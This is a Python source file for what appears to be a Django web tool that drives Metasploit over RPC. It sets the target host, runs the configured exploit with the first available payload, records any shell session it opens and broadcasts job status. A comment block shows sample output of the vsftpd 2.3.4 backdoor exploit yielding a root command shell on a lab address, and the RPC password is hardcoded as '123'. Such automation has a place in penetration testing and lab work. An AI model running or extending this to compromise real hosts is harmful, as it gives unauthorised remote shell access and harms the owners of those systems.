import time
import json
from metasploit.msfrpc import MsfRpcClient
from .models import Config_exploit
from channels import Group

from .models import Config_exploit,Exploiated_system,Job

# main exploitation script 

class MSF_rpc_Hhandler(object):
    """docstring for ClassName"""

    def try_exploit(self,config_id,req_job_id):
        if config_id:
            configured_exploit = Config_exploit.objects.get(pk=config_id)
            job   =  Job.objects.get(pk=req_job_id)

            config_host_name     = configured_exploit.config_host_name
            config_host_id        = configured_exploit.config_host_id
            config_cve_number      = configured_exploit.config_cve_number
            config_exploit_name     = configured_exploit.config_exploit_name
            config_payload_name     = configured_exploit.config_payload_name
            config_rhost             = configured_exploit.config_rhost
            config_rport             = configured_exploit.config_rport 

            config_exploit_name = config_exploit_name.encode("UTF8")
            config_exploit_name = config_exploit_name.replace(" ","")

            print config_host_name
            print config_exploit_name
        try:
            client = MsfRpcClient("123",server="127.0.0.1",ssl=False)
            print (" [ Exploit ] Rpc server  connected ")
        except Exception as e:
            job.exploit_lock = "no"
            job.save()
            print (" [ Exploit ] Rpc server not connected ")
            Group('pool').send({
                    "text": json.dumps({
                        "action": "exploiting_remort_host",
                        "msf_exploit_current_status":  "\n xerror@w11:~> Metasploit Connection Not succesfuull \n",
                        "job_status": "Error",
                        "job_id": config_cve_number,
                           })
                       })
        else:
            try:
                
                print config_exploit_name

                exploit = client.modules.use('exploit',config_exploit_name) #'unix/ftp/vsftpd_234_backdoor'
                # exploit = client.modules.use('exploit','unix/ftp/vsftpd_234_backdoor') #
                print (" [ Exploit ] Launcing exploit ")
                time.sleep(5)

                # Rhost configuration 
                try:
                    exploit['RHOSTS'] = config_host_name
                except Exception as e:
                    exploit['RHOST'] = config_host_name

# handle payload error 
                try:
                    # rhost_expl  = exploit.execute(payload='cmd/unix/interact')
                    
                    print (" [ Exploit ] Setting following Payload  ")
                    print exploit.payloads[0]
                    rhost_expl  = exploit.execute(payload=exploit.payloads[0])

                    time.sleep(20)
                except Exception as e:
                    job.exploit_lock = "no"
                    job.save()
                    Group('pool').send({
                        "text": json.dumps({
                        "action": "exploiting_remort_host",
                        "msf_exploit_current_status":  "\n xerror@w11:~> Metasploit Exploit Payload ERROR Binding  \n",
                        "job_status": "Payload Error",
                        "job_id": config_cve_number,
                           })
                       })
                else:
                    print (" [ Exploit ] Exploited EXecuted successfully  ")
                    print rhost_expl
                    print(28*"*")
                    exploit_msf_job_id = rhost_expl['job_id']

                    if exploit_msf_job_id != None: 
                        print " [ Exploit ] if Eploit/job id have not none"

                        try:
                            exploit_msf_job_uuid        = rhost_expl['uuid']
                            exploit_msf_session_list    =  client.sessions.list
                            print client.sessions.list

                            # parse the sessoin list dataea
                            sessoin_data_parsed = self.exploit_sesion_list_parser( exploit_msf_job_uuid , exploit_msf_session_list )
                            print " [ Exploit ]  System Exploited checking sesion dtail "
                            exploited_session_detail =  Exploiated_system()

                            exploited_session_detail.host_name      = config_host_name
                            exploited_session_detail.cve_number     = config_cve_number
                            exploited_session_detail.exploit_name   = config_exploit_name
                            exploited_session_detail.payload_name   = config_payload_name
                            exploited_session_detail.host_id        = config_host_id
                            exploited_session_detail.exploited      =  "yes"
                            exploited_session_detail.exploit_rport      =  config_rport
                           
                            if sessoin_data_parsed :
                                print " [ Exploit ]  System session found and saved  "
                                exploited_session_detail.session_id     = sessoin_data_parsed['session_id']
                                exploited_session_detail.exploit_uuid   = sessoin_data_parsed['exploit_uuid']
                                exploited_session_detail.session_type   = sessoin_data_parsed['exploit_type']
                                exploited_session_detail.tunnel_peer    = sessoin_data_parsed['tunnel_peer']
                                exploited_session_detail.save()
                                job.exploit_status = "Exploited/sessioned"

                                Group('pool').send({
                                   "text": json.dumps({
                                    "action": "exploiting_remort_host",
                                    "msf_exploit_current_status":  "\n xerror@w11:~> Remote system exploited and Session was created  \n",
                                    "job_status": "sessioned",
                                    "sessions" : client.sessions.list.keys(),
                                    "job_id": config_cve_number,
                                       })
                                   })

                            else:
                                job.exploit_status = "Exploited only"

                                exploited_session_detail.session_id     = "no"
                                exploited_session_detail.exploit_uuid   = "no"
                                exploited_session_detail.session_type   = "no"
                                exploited_session_detail.tunnel_peer    = "no"
                                exploited_session_detail.save()


                                print " [ Exploit ]  System session not found and exploit detail saved  "
                                exploited_session_detail.save()
                                Group('pool').send({
                                   "text": json.dumps({
                                    "action": "exploiting_remort_host",
                                    "msf_exploit_current_status":  "\n xerror@w11:~> exploitaiton Complteted but no Session was created  \n",
                                    "job_status": "Exploited only",
                                    "sessions" : client.sessions.list.keys(),
                                    "job_id": config_cve_number,
                                       })
                                   })
                            job.exploit_lock = "no"
                            job.save()

                            # print sessoin_data_parsed
                            # print client.sessions.list

                        except Exception as e:
                            print " [ Exploit ]  session erro"
                            print e

                            job.exploit_lock = "no"
                            job.save()

                            Group('pool').send({
                                "text": json.dumps({
                                "action": "exploiting_remort_host",
                                "msf_exploit_current_status":  "\n xerror@w11:~> After exploitaiton session hanve error   \n",
                                "job_status": "Exploited",
                                "job_id": config_cve_number,
                                   })
                               })

                    else:
                        job.exploit_status = "not_exploited "
                        job.exploit_lock = "no"
                        job.save()
                        Group('pool').send({
                        "text": json.dumps({
                            "action": "exploiting_remort_host",
                            "msf_exploit_current_status":  "\n xerror@w11:~> Remote system Exploitation not Succesfull   \n",
                            "job_status": "Not Exploited",
                            "job_id": config_cve_number,
                               })
                           })

            except Exception as e:
                job.exploit_lock = "no"
                job.save()
                Group('pool').send({
                    "text": json.dumps({
                        "action": "exploiting_remort_host",
                        "msf_exploit_current_status":  "\n xerror@w11:~> Metasploit Exploiation Process ERROR  \n",
                        "job_status": "Exploiation Error",
                        "job_id": config_cve_number,
                           })
                       })


    def exploit_sesion_list_parser(self,uuid,sessoin_list):

        sessoin_dict = sessoin_list
        temp_dict = {}
        for key in sessoin_dict.keys():
            temp_obj = sessoin_dict[key]
            if temp_obj['exploit_uuid']  == uuid :
                temp_dict['target_host']  = temp_obj['target_host']
                temp_dict['session_id']   = str(key)
                temp_dict['exploit_uuid'] = temp_obj['exploit_uuid']
                temp_dict['exploit_type'] = temp_obj['type']
                temp_dict['tunnel_peer']  = temp_obj['tunnel_peer']
                print " [ Exploit ]  session uuid found"
            print " [ Exploit ]  session uuid checking"

        print " [ Exploit ] session uuid data"
        # print temp_dict

        if len(temp_dict) == 0:
            return None
        else:
            return temp_dict
'''

{'job_id': 0, 'uuid': '1muztswx'}

{1: 
{'info': '', 
    'username': 'root', 
    'session_port': 21,
     'via_payload': 'payload/cmd/unix/interact', 
     'uuid': 'yvsnneml', 
     'tunnel_local': '0.0.0.0:0', 
     'via_exploit': 'exploit/unix/ftp/vsftpd_234_backdoor', 
     'arch': 'cmd', 
     'exploit_uuid': '1muztswx', 
     'tunnel_peer': '172.16.217.128:6200', 
     'workspace': 'false', 
     'routes': '', 
     'target_host': '172.16.217.128', 
     'type': 'shell', 
     'session_host': '172.16.217.128', 
     'desc': 'Command shell'
 }

'''





#     exploit['RHOST'] = "172.16.217.128"

# except Exception as e:
#     exploit['RHOSTS'] = "172.16.217.128"


#                 Group('pool').send({
#                     "text": json.dumps({
#                         "action": "exploiting_remort_host",
#                         "msf_exploit_current_status":  "\n xerror@w11:~> Metasploit RHOST CONFIG ERROR  \n",
#                         "job_status": "Error",
#                         "job_id": config_cve_number,
#                            })
#                        })

# # a = MSF_rpc_Hhandler()
# a.try_exploit(10)













